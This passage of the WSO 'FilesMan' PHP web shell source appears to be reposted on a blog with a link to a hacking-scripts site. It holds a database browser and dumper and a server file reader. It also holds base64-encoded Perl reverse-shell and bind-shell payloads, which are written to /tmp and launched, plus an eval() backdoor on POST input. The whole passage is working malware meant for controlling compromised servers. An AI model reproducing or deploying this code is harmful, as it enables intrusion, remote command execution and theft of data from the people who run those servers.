                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i&lt;d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		&lt;/script&gt;";
	if(isset($db) && $db-&gt;link){
		echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;";
			if(!empty($_POST['sql_base'])){
				$db-&gt;selectdb($_POST['sql_base']);
				echo "&lt;tr&gt;&lt;td width=1 style='border-top:2px solid #666;'&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;";
				$tbls_res = $db-&gt;listTables();
				while($item = $db-&gt;fetch($tbls_res)) {
					list($key, $value) = each($item);
                    if(!empty($_POST['sql_count']))
                        $n = $db-&gt;fetch($db-&gt;query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "&lt;nobr&gt;&lt;input type='checkbox' name='tbl[]' value='".$value."'&gt;&nbsp;&lt;a href=# onclick=\"st('".$value."',1)\"&gt;".$value."&lt;/a&gt;" . (empty($_POST['sql_count'])?'&nbsp;':" &lt;small&gt;({$n['n']})&lt;/small&gt;") . "&lt;/nobr&gt;&lt;br&gt;";
				}
				echo "&lt;input type='checkbox' onclick='is();'&gt; &lt;input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'&gt;&lt;br&gt;File path:&lt;input type=text name=file value='dump.sql'&gt;&lt;/td&gt;&lt;td style='border-top:2px solid #666;'&gt;";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db-&gt;query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db-&gt;fetch();
					$pages = ceil($num['n'] / 30);
                    echo "&lt;script&gt;d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}&lt;/script&gt;&lt;span&gt;".$_POST['p2']."&lt;/span&gt; ({$num['n']} records) Page # &lt;input type=text name='p3' value=" . ((int)$_POST['p3']) . "&gt;";
                    echo " of $pages";
                    if($_POST['p3'] &gt; 1)
                        echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'&gt;&lt; Prev&lt;/a&gt;";
                    if($_POST['p3'] &lt; $pages)
                        echo " &lt;a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'&gt;Next &gt;&lt;/a&gt;";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "&lt;br&gt;&lt;br&gt;";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db-&gt;query(@$_POST['p2']);
					if($db-&gt;res !== false) {
						$title = false;
						echo '&lt;table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929"&gt;';
						$line = 1;
						while($item = $db-&gt;fetch())	{
							if(!$title)	{
								echo '&lt;tr&gt;';
								foreach($item as $key =&gt; $value)
									echo '&lt;th&gt;'.$key.'&lt;/th&gt;';
								reset($item);
								$title=true;
								echo '&lt;/tr&gt;&lt;tr&gt;';
								$line = 2;
							}
							echo '&lt;tr class="l'.$line.'"&gt;';
							$line = $line==1?2:1;
							foreach($item as $key =&gt; $value) {
								if($value == null)
									echo '&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;';
								else
									echo '&lt;td&gt;'.nl2br(htmlspecialchars($value)).'&lt;/td&gt;';
							}
							echo '&lt;/tr&gt;';
						}
						echo '&lt;/table&gt;';
					} else {
						echo '&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; '.htmlspecialchars($db-&gt;error()).'&lt;/div&gt;';
					}
				}
				echo "&lt;br&gt;&lt;/form&gt;&lt;form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'&gt;&lt;textarea name='query' style='width:100%;height:100px'&gt;";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value='Execute'&gt;";
				echo "&lt;/td&gt;&lt;/tr&gt;";
			}
			echo "&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;";
            if($_POST['type']=='mysql') {
                $db-&gt;query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db-&gt;fetch())
                    echo "&lt;form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db-&gt;loadFile($_POST['p2']);
				echo '&lt;pre class=ml1&gt;'.htmlspecialchars($file['file']).'&lt;/pre&gt;';
			}
	} else {
        echo htmlspecialchars($db-&gt;error());
    }
	echo '&lt;/div&gt;';
	wsoFooter();
}
function actionNetwork() {
	wsoHeader();
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "&lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt;

	&lt;form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\"&gt;
	&lt;span&gt;Bind port to /bin/sh 1&lt;/span&gt;&lt;br/&gt;
	Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt;
	&lt;/form&gt;
	&lt;form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"&gt;
	&lt;span&gt;Back-connect  1&lt;/span&gt;&lt;br/&gt;
	Server: &lt;input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt;

	&lt;/form&gt;&lt;br&gt;";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1&gt;/dev/null 2&gt;&1 &");
			echo "&lt;pre class=ml1&gt;$out\n".wsoEx("ps aux | grep bp.pl")."&lt;/pre&gt;";
            unlink("/tmp/bp.pl");
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1&gt;/dev/null 2&gt;&1 &");
			echo "&lt;pre class=ml1&gt;$out\n".wsoEx("ps aux | grep bc.pl")."&lt;/pre&gt;";
            unlink("/tmp/bc.pl");
		}
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" =&gt; php_uname(),
			"php_version" =&gt; phpversion(),
			"wso_version" =&gt; WSO_VERSION,
			"safemode" =&gt; @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
exit;
?>
{% endhighlight %}

 [1]: http://hackingscripts.com/filesman-shell-encrypted/ "FilesMan Shell"